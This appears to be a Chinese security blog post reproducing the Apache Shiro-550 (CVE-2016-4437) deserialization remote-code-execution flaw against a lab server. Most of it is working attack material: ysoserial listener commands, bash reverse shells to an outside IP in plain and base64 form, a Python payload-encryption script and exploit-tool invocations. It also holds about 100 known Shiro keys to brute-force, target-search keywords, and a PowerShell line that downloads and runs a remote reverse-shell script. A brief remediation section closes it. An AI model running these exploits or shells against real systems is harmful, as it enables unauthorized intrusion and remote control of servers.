# Apache Shiro 反序列化漏洞（Shiro-550 CVE-2016-4437） - 渗透测试中心 - 博客园

> 原文：[https://www.cnblogs.com/backlion/p/14077804.html](https://www.cnblogs.com/backlion/p/14077804.html)

### 0x00 漏洞描述

Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。

### 0x01 影响版本

Apache Shiro <= 1.2.4

### 0x02 漏洞原理

Apache Shiro框架提供了记住我的功能（RememberMe），关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。用户登陆成功后会生成经过加密并编码的cookie。Apache Shiro 1.2.4及以前版本中，Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 > Base64解码–>AES解密–>反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞

在服务端接收cookie值时，按照如下步骤来解析处理：
1、检索RememberMe cookie 的值
2、Base 64解码
3、使用AES解密(加密密钥硬编码)
4、进行反序列化操作（未作过滤处理）

但是，AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞

### 0x03 漏洞原因

大概意思是，shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro使用了CookieRememberMeManager类对用户的登陆凭证，也就是Remember Me的内容进行一系列处理：

使用Java序列化 ---> 使用密钥进行AES加密 ---> Base64加密 ---> 得到加密后的Remember Me内容

同时在识别用户身份的时候，需要对Remember Me的字段进行解密，解密的顺序为：

Remember Me加密内容 ---> Base64解密 ---> 使用密钥进行AES解密 --->Java反序列化

问题出在AES加密的密钥Key被硬编码在代码里，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段发送，Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞。

### 0x04 漏洞利用条件

由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。 ### 0x05  漏洞搜索关键字 fofa的搜索关键词：header="rememberme=deleteMe"github搜索关键词:

```
securityManager.rememberMeManager.cipherKey  cookieRememberMeManager.setCipherKey  setCipherKey(Base64.decode
```

### 0x06  漏洞特征

shiro反序列化的特征：在返回包的 Set-Cookie 中存在 rememberMe=deleteMe 字段

### 0x07  环境搭建

1.下载镜像 docker pull medicean/vulapps:s_shiro_1 ![](../Images/877976a2bad968d499fc670c8fc219ed.png)2.直接运行镜像，将docker的8080端口映射到本地的 8080上: docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1 ![](../Images/b5df8c715dee784799f05aed007267a1.png)3.访问地址：http://149.28.94.72:8080/，可以看到环境被成功搭建 ![](../Images/dd44b40eb6e643e09736db30a55c8b3b.png)或者：[https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437](https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437)

```
docker-compose up -d
```

```
服务启动后，访问http://your-ip:8080可使用admin:vulhub进行登录
```

### 0x08  漏洞复现

**一、最基本方式复现利用复现**1.ysoserial-0.0.6-SNAPSHOT-all.jar文件下载：root@shiro:~/Shiro_exploit# wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar![](../Images/62487f34b859a8995e1d8eb181eb8292.png)2.访问漏洞靶场，并使用burp对其抓包，输入正确的用户名和密码，勾选Remember Me选项。查看返回包中Set-Cookie中是否存在rememberMe=deleteMe字段。![](../Images/76ddde08694c708d8330596b1e66c8ce.png)3.对登录的页面进行抓包![](../Images/d74d5d1872c0d0d37fb5cb9341544b2a.png)4.抓到包发送到repeater，重放即可看到cookie中包含rememberMe=deleteMe字段![](../Images/2c10a8e139450d0640180a8bb804241e.png)5.然后在攻击机执行以下命令：（通过 ysoserial中的JRMP监听模块，监听 1086 端口并执行反弹shell命令）
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1086 CommonsCollections4 “bash命令” 注：payloads/JRMPClient 是结合 exploit/JRMPListener 使用的；
JRMPListener是ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据 发送到 Server 中，然后Server中进行反序列化操作，并开启指定端口，然后在通过JRMPClient去发送攻击 payload；
payloads/JRMPClient 生存的 payload 是发送给目标机器的，exploit/JRMPListener 是在自己服务器上使用的。然后我们来构造payload来进行反弹shell的操作，写好bash反弹shell的命令
bash -i >& /dev/tcp/149.28.94.72/2222   0>&1
然后转换成加密后的指令（去这个网站http://www.jackson-t.ca/runtime-exec-payloads.html） ![](../Images/d34c072f34099359e2b9ef15d55a57ba.png)bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDkuMjguOTQuNzIvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i} 注：为什么要对反弹shell进行编码？在exec()函数中，">"管道符是没有意义的，会被解析为其他的意义，而我们的反弹shell命令中又必须使用，所以需要编码。另外，StringTokenizer类会破坏其中包含空格的参数，该类将命令字符串按空格分隔。诸如此类的东西 ls "My Directory"将被解释为ls '"My' 'Directory"'6.最终在攻击机上执行的命令如下：java -cp  ysoserial-master-SNAPSHOT.jar   ysoserial.exploit.JRMPListener 1086 CommonsCollections4 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDkuMjguOTQuNzIvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i}” ![](../Images/c255c7bcf3ab17ca37ee9616fc9ae16f.png)7.使用shiro.py生成payload，需要python2的环境，使用Shiro内置的默认密钥对Payload进行加密：shiro.py:import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == '__main__':    payload = encode_rememberme(sys.argv[1])   print "rememberMe={0}".format(payload.decode())8.对目标靶机进行payload加密处理root@shiro:~/Shiro_exploit# python shiro.py 149.28.94.72:1099  //攻击机的ip地址和java监听端口，shiro.py需要和ysoserial.jar放在同一个目录下。rememberMe=Js0Jb6NWTG6O1ZvE0Y6L2cXY9xbf/F6SGZHcoL11yHyKy3gRXdgGRmS3XUUCdq+mPLOc6WzlFpEqdpm+o1RS3fN8N2JWzDI7XI4zZLcI3V3SVhasOqoYX6Eb5s7AQLHePx6T7p8s5XTa5/pdny+bHGLoFJnCR8fa9P1VkcUAdvNuEEfEd4K+zYzSEmVDMdvgCLEx4FZ4zME52g+zGaMfn+L3FcXIy397e+L8FFHoMIayzxnl6D/17Z5hJdlx97xrqB31ZbdoIryiP1VmzDoqgP6ZEfewtH8k9bWyT5ZrSNwOe7FhcNxsrscTD+cboMqt5NUWNH9Jz4pk4VeHyMuAZaZ3TVb9ebfBThYnXvSHTwsEKlTp8sGPsCsKbbMCFKL3Q6qR+ri+15FozlEAsfvliA==![](../Images/8195ccc52fa310904821a68ba35c8ff3.png)9.然后在攻击机上监听2222端口，等待shell反弹![](../Images/386b075041473a4e95bd447e8e7d798d.png)10.将生成的remeberMe值添加到cookie字段内的jessionid后边，用分号隔开添加刚生成的payload，然后将数据包放行![](../Images/0958fcc4c39b161d9774189bf0fc63a3.png)11.数据包发送之后查看攻击机中java监听接口和nc监听端口结果显示如下图![](../Images/f3880bfd63a545805dd1ea3f096f7cf6.png)![](../Images/f515cd8e50eae7aff7d416e253631245.png)**二、**Shiro_exploit脚本利用复现********1.**使用Shiro_exploit的poc对目标靶机**key的爆破检查****root@shiro:~/Shiro_exploit# python3  shiro_exploit.py -u   http://149.28.94.72:8080 ![](../Images/032f52c0eaa2ecd6c0ddc27e2aaa6b75.png)**![](../Images/40fdc36ff92771bd92d2fb380f01fad3.png)****2.使用Shiro_exploit的poc执行反弹shell** root@shiro:~# git  clone  https://github.com/insightglacier/Shiro_exploit.gitroot@shiro:~/Shiro_exploit# pip3  install pycryptodome

```
<code-pre class="code-pre" id="pre-fJw6Qr" style="">python3 shiro_exploit.py -t 3 -u [http://149.28.94.72:8080](http://149.28.94.72:8080) -p "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDkuMjguOTQuNzIvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i}"</code-pre>
```

```
<code-pre class="code-pre" style="">![](../Images/01ceb0c2ba2b244ac9398c2e33db3854.png)</code-pre>
```

nc  -lvvp  2222![](../Images/446b0b27706744aab3ef0cab7cda290f.png)**3.使用Shiro_exploit的poc进行在目标靶机创建文件** <code-box id="4paKKH" style="">```
<code-pre class="code-pre" id="pre-ZcSSnD" style="">python3 shiro_exploit.py -t 3 -u [http://149.28.94.72:8080](http://149.28.94.72:8080) -p "touch test.txt"</code-pre> 
```</code-box> ![](../Images/e6f64ca52521507714cd805fd35e7d24.png)成功在服务器创建a.txt文件 [![](../Images/63c2e749373f928d1bad93d0ce528334.png)](https://img2020.cnblogs.com/blog/1395105/202005/1395105-20200527104527580-457092711.png)**4.使用Shiro_exploit的poc检测可用gadget的方式**python3  shiro_exploit.py -u [http://149.28.94.72:8080      -t  3   -p   "ping -c 2  1m054t.dnslog.cn"   -k   "kPH+bIxk5D2deZiIxcaaaA=="](http://149.28.94.72:8080      -t  3   -p   "ping -c 2  1m054t.dnslog.cn"   -k   "kPH+bIxk5D2deZiIxcaaaA==")![](../Images/a9c0b694071f63ba1332483c344031ef.png)dnslog上会看到请求的域名，证明漏洞存在![](../Images/cb5a88badd1f71aa7a76d5302e916ee4.png)**三、ShiroExploit图形化工具利用****复现******[https://github.com/feihong-cs/ShiroExploit](https://github.com/feihong-cs/ShiroExploit)Shiro550无需提供rememberMe Cooki![](../Images/bd858985221da22d267ed5b14f89a902.png)![](../Images/8d9d89635a0987a0199065e2e909e641.png)![](../Images/c8a46e674fe39da1678223789778ba89.png)![](../Images/64f5118dc74d967df84c5d7bc4a24875.png)攻击机执行:（可以看到成功反弹shell)nc  -lvvp  3333    ![](../Images/96c90882bd7560ed6f154f6b7439ddb9.png)**四、ShiroScan脚本利用****复现********使用**ShiroScan脚本对**漏洞进行检查**root@shiro:~# git clone https://github.com/sv3nbeast/ShiroScan.gitroot@shiro:~#pip3 install -r requirments.txtroot@shiro:~/ShiroScan# python3 shiro_rce.py  http://149.28.94.72:8080/   "ping  ijinvv.dnslog.cn"![](../Images/8fe83c47142626777c508a5d65d3b221.png)

### 

```
五、shiro_crack.py 脚本利用****复现****
```

```
1.爆破模块漏洞检查

```

```

```
git  clone [https://github.com/bkfish/Awesome_shiro](https://github.com/bkfish/Awesome_shiro)
```

```

```
python3 shiro_crack.py http://149.28.94.72:8080/   m55a3c.dnslog.cn  #需要结合http://dnslog.cn 
```

![](../Images/97e4226a3a64401c97c2d6d88ce066ad.png)

成功后查看记录,记录格式为 {{key}}.{{module}}.dnslogurl

```
kPH.bIxk5D2deZiIxcaaaA.CommonsCollections2.m55a3c.dnslog.cn 
```

可知成功的key为kPH.bIxk5D2deZiIxcaaaA==,模块为CommonsBeanutils2 因为key中包含==/+等符号.

![](../Images/2fd05dd8593d24722eb216b6ff21756e.png)其实网上有很多爆破模块和key的工具，但是爆破成功后一般只是打通，并不知道模块和key是什么，因为对于无回显的rce，无论通没通，响应码均为200。 本项目通过爆破模块和key结合dnslog间接获取成功的key和模块，原理即为DNSlog的内涵，Dns在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息。

### **2.shiro_getshell 反弹shell**root@shiro:~/Awesome_shiro/shiro_getshell# python3  shiro_getshell.py     -u    http://149.28.94.72:8080    -lh   149.28.94.72   -lp   3333![](../Images/d59be1ddc4d7b9e102b57e8d14df00c9.png)root@shiro:~# nc  -lvvp 3333![](../Images/bafd628a39f99559bae1bc4862ced39d.png)**3.批量检查**根据请求头，响应头做一个简单的测试-将有shiro的网站丢到shiro.txt中![](../Images/55abb842c4979534a42c54f50338180c.png)![](../Images/9cbc0ff40cad0e155babd6d8aa634789.png)![](../Images/b66b50b6d76674fc248094208151d27f.png)**六、ShiroScan图像化工具利用****复现******[https://github.com/fupinglee/ShiroScan](https://github.com/fupinglee/ShiroScan)**1.漏洞检查**![](../Images/7260f9a3de8f03fa23d7397443e6b060.png)![](../Images/9be5994c6a8b6f3224ef60b8922053ee.png)**2.RCE命令执行**![](../Images/08e3ae3f482e471203bdc7d4da69bb46.png)经测试只有commonscollections8和commonscollections2可以执行命令![](../Images/82722b3e7016f1547d7014eed3c3c290.png)![](../Images/0a59603da3e9f97e7b5458af173cd1c7.png)![](../Images/4b67da8a09c97cf5c900b3c1dac13ee1.png)**3.附上默认的****100key（可复制到检查key中）**

```
kPH+bIxk5D2deZiIxcaaaA==
```

```
4AvVhmFLUs0KTA3Kprsdag==
```

```
Z3VucwAAAAAAAAAAAAAAAA==
```

```
fCq+/xW488hMTCD+cmJ3aQ==
```

```
0AvVhmFLUs0KTA3Kprsdag==
```

```
1AvVhdsgUs0FSA3SDFAdag==
```

```
1QWLxg+NYmxraMoxAXu/Iw==
```

```
25BsmdYwjnfcWmnhAciDDg==
```

```
2AvVhdsgUs0FSA3SDFAdag==
```

```
3AvVhmFLUs0KTA3Kprsdag==
```

```
3JvYhmBLUs0ETA5Kprsdag==
```

```
r0e3c16IdVkouZgk1TKVMg==
```

```
5aaC5qKm5oqA5pyvAAAAAA==
```

```
5AvVhmFLUs0KTA3Kprsdag==
```

```
6AvVhmFLUs0KTA3Kprsdag==
```

```
6NfXkC7YVCV5DASIrEm1Rg==
```

```
6ZmI6I2j5Y+R5aSn5ZOlAA==
```

```
cmVtZW1iZXJNZQAAAAAAAA==
```

```
7AvVhmFLUs0KTA3Kprsdag==
```

```
8AvVhmFLUs0KTA3Kprsdag==
```

```
8BvVhmFLUs0KTA3Kprsdag==
```

```
9AvVhmFLUs0KTA3Kprsdag==
```

```
OUHYQzxQ/W9e/UjiAGu6rg==
```

```
a3dvbmcAAAAAAAAAAAAAAA==
```

```
aU1pcmFjbGVpTWlyYWNsZQ==
```

```
bWljcm9zAAAAAAAAAAAAAA==
```

```
bWluZS1hc3NldC1rZXk6QQ==
```

```
bXRvbnMAAAAAAAAAAAAAAA==
```

```
ZUdsaGJuSmxibVI2ZHc9PQ==
```

```
wGiHplamyXlVB11UXWol8g==
```

```
U3ByaW5nQmxhZGUAAAAAAA==
```

```
MTIzNDU2Nzg5MGFiY2RlZg==
```

```
L7RioUULEFhRyxM7a2R/Yg==
```

```
a2VlcE9uR29pbmdBbmRGaQ==
```

```
WcfHGU25gNnTxTlmJMeSpw==
```

```
OY//C4rhfwNxCQAQCrQQ1Q==
```

```
5J7bIJIV0LQSN3c9LPitBQ==
```

```
f/SY5TIve5WWzT4aQlABJA==
```

```
bya2HkYo57u6fWh5theAWw==
```

```
WuB+y2gcHRnY2Lg9+Aqmqg==
```

```
kPv59vyqzj00x11LXJZTjJ2UHW48jzHN
```

```
3qDVdLawoIr1xFd6ietnwg==
```

```
ZWvohmPdUsAWT3=KpPqda
```

```
YI1+nBV//m7ELrIyDHm6DQ==
```

```
6Zm+6I2j5Y+R5aS+5ZOlAA==
```

```
2A2V+RFLUs+eTA3Kpr+dag==
```

```
6ZmI6I2j3Y+R1aSn5BOlAA==
```

```
SkZpbmFsQmxhZGUAAAAAAA==
```

```
2cVtiE83c4lIrELJwKGJUw==
```

```
fsHspZw/92PrS3XrPW+vxw==
```

```
XTx6CKLo/SdSgub+OPHSrw==
```

```
sHdIjUN6tzhl8xZMG3ULCQ==
```

```
O4pdf+7e+mZe8NyxMTPJmQ==
```

```
HWrBltGvEZc14h9VpMvZWw==
```

```
rPNqM6uKFCyaL10AK51UkQ==
```

```
Y1JxNSPXVwMkyvES/kJGeQ==
```

```
lT2UvDUmQwewm6mMoiw4Ig==
```

```
MPdCMZ9urzEA50JDlDYYDg==
```

```
xVmmoltfpb8tTceuT5R7Bw==
```

```
c+3hFGPjbgzGdrC+MHgoRQ==
```

```
ClLk69oNcA3m+s0jIMIkpg==
```

```
Bf7MfkNR0axGGptozrebag==
```

```
1tC/xrDYs8ey+sa3emtiYw==
```

```
ZmFsYWRvLnh5ei5zaGlybw==
```

```
cGhyYWNrY3RmREUhfiMkZA==
```

```
IduElDUpDDXE677ZkhhKnQ==
```

```
yeAAo1E8BOeAYfBlm4NG9Q==
```

```
cGljYXMAAAAAAAAAAAAAAA==
```

```
2itfW92XazYRi5ltW0M2yA==
```

```
XgGkgqGqYrix9lI6vxcrRw==
```

```
ertVhmFLUs0KTA3Kprsdag==
```

```
5AvVhmFLUS0ATA4Kprsdag==
```

```
s0KTA3mFLUprK4AvVhsdag==
```

```
hBlzKg78ajaZuTE0VLzDDg==
```

```
9FvVhtFLUs0KnA3Kprsdyg==
```

```
d2ViUmVtZW1iZXJNZUtleQ==
```

```
yNeUgSzL/CfiWw1GALg6Ag==
```

```
NGk/3cQ6F5/UNPRh8LpMIg==
```

```
4BvVhmFLUs0KTA3Kprsdag==
```

```
MzVeSkYyWTI2OFVLZjRzZg==
```

```
CrownKey==a12d/dakdad
```

```
empodDEyMwAAAAAAAAAAAA==
```

```
A7UzJgh1+EWj5oBFi+mSgw==
```

```
YTM0NZomIzI2OTsmIzM0NTueYQ==
```

```
c2hpcm9fYmF0aXMzMgAAAA==
```

```
i45FVt72K2kLgvFrJtoZRw==
```

```
U3BAbW5nQmxhZGUAAAAAAA==
```

```
ZnJlc2h6Y24xMjM0NTY3OA==
```

```
Jt3C93kMR9D5e8QzwfsiMw==
```

```
MTIzNDU2NzgxMjM0NTY3OA==
```

```
vXP33AonIp9bFwGl7aT7rA==
```

```
V2hhdCBUaGUgSGVsbAAAAA==
```

```
Z3h6eWd4enklMjElMjElMjE=
```

```
Q01TX0JGTFlLRVlfMjAxOQ==
```

```
ZAvph3dsQs0FSL3SDFAdag==
```

```
Is9zJ3pzNh2cgTHB4ua3+Q==
```

```
NsZXjXVklWPZwOfkvk6kUA==
```

```
GAevYnznvgNCURavBhCr1w==
```

```
66v1O8keKNV3TTcGPK1wzg==
```

```
SDKOLKn2J1j/2BHjeZwAoQ==
```

**八、shiro_tool命令行工具利用****复现******

```
[https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip](https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip) 
```

```
root@shiro:~/shiro_tool# java -jar shiro_tool.jar   http://149.28.94.72:8080 
```

![](../Images/6513a649994f665d4da5e213c9e25b0e.png)选择1然后输入命令：curl 7dxz8d.dnslog.cn![](../Images/1a04c6f1aebf93359b2ea8765939f8bf.png)bash=bash -i >& /dev/tcp/149.28.94.72/2222   0>&1 ![](../Images/d7ab8e3691aff27c25cbe5cd540f02e7.png)![](../Images/2fe28637f9f4f251b44a0fd5059244c2.png)输入命令：output=on              #开启执行远程命令输入命令：x=whoami     #可执行系统命令![](../Images/211310a06334cbd83ed123fb205f93d2.png)![](../Images/7576fc6951e29078c83ce3aa2662679c.png)

### 0x09  漏洞插件检查

https://github.com/Daybr4ak/ShiroScan（burp插件Shiroscan）![](../Images/5263c860962701f5c9e40d43fb449d51.png)![](../Images/15843d0d01faa1033dd53a4aea131f93.png)或者通过bupusit抓取关键cookie值：rememberMe=deleteMe![](../Images/70938c413445513b30ecda17d2ace391.png) 

### 0x10  漏洞修复

1.升级Shiro到最新版2.如果在配置里配置了密钥, 那么请一定不要使用网上的密钥, 一定不要! ! 请自己base64一个AES的密钥, 或者利用官方提供的方法生成密钥: org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey().public class GenerateCipherKey { /**  * 随机生成秘钥，参考org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)  * @return  */ public static byte[] generateNewKey() {     KeyGenerator kg;     try {         kg = KeyGenerator.getInstance("AES");     } catch (NoSuchAlgorithmException var5) {         String msg = "Unable to acquire AES algorithm.  This is required to function.";         throw new IllegalStateException(msg, var5);     }     kg.init(128);     SecretKey key = kg.generateKey();     byte[] encoded = key.getEncoded();     return encoded; }}3.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上4.WAF拦截Cookie中长度过大的rememberMe值

### 0x11 漏洞总结

```
测试时, 首先需要对网站基本信息有一个收集, 要知道它是什么系统, linux与windows反弹shell的命令不同 ：
1.linux(需要编码处理): bash -i >& /dev/tcp/149.28.94.72/2222  0>&12.windwos(不需要编码处理): powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 149.28.94.72  -port 22223.响应包中出现<rememberMe=deleteMe>可以用来大概判断是否使用了Shiro.4.关于反弹shell命令, 如果不编码会命令执行失败. 简单说就是反弹shell的命令中包含一些特殊的符号, 在进行反序列化的时候会导致命令无法正常解析5.测试时, 最好先使用ping命令和dnlslog用来检测漏洞是否存在, 因为复杂的命令可能因为各种原因执行失败, 影响判断.6.关于利用模块的选择,可以对CommonsCollections1, CommonsCollections3, CommonsCollections5分别挨过测试，也可以利用图形化工具来判断选择哪个利用模块  
```